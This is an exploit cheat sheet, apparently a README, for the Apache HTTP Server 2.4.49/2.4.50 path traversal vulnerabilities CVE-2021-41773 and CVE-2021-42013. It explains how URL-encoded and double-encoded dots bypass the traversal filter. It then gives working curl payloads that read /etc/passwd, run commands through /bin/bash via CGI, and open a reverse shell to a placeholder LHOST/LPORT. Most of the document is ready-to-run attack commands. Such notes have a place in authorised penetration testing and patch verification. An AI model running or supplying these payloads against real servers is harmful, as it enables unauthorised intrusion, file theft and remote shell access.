# CVE-2021-41773/42013 - Apache HTTP Server v2.4.49 & v2.4.50

## Pre-required

- Apache version: `2.4.49` or `2.4.50`
- In the apache config the target directory should be set to: `Require all granted` 
- For **RCE**: `CGI module` must be enable

## Note

To perform a path travercal attack we need to use the payload: `../../../../../`, but for this application it is filtered ! A simple bypass is to **URL encode** at less one for the two `.` : `/.%2e/.%2e/.%2e/.%2e/` for the version **2.4.49** and to **double URL encode** at less one for the two `.` : `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/` for the version **2.4.50**



> URL encode 

    .   -> %2E
    %2E -> %%32%65

## Apache HTTP Server v2.4.49

### LFI - Path travercal

```bash
curl -v 'http://TARGET_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
```

### RCE

```bash
curl -v 'http://TARGET_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"
```

> Get a shell

```bash
curl -v 'http://TARGET_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; /bin/bash -c "/bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1" &' -H "Content-Type: text/plain"
```

## Apache HTTP Server v2.4.50

### LFI - Path travercal
```bash
curl 'http://TARGET_IP/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
```

### RCE

```bash
curl -v 'http://TARGET_IP/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"
```

> Get a shell

```bash
curl -v 'http://TARGET_IP/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; /bin/bash -c "/bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1" &' -H "Content-Type: text/plain"
```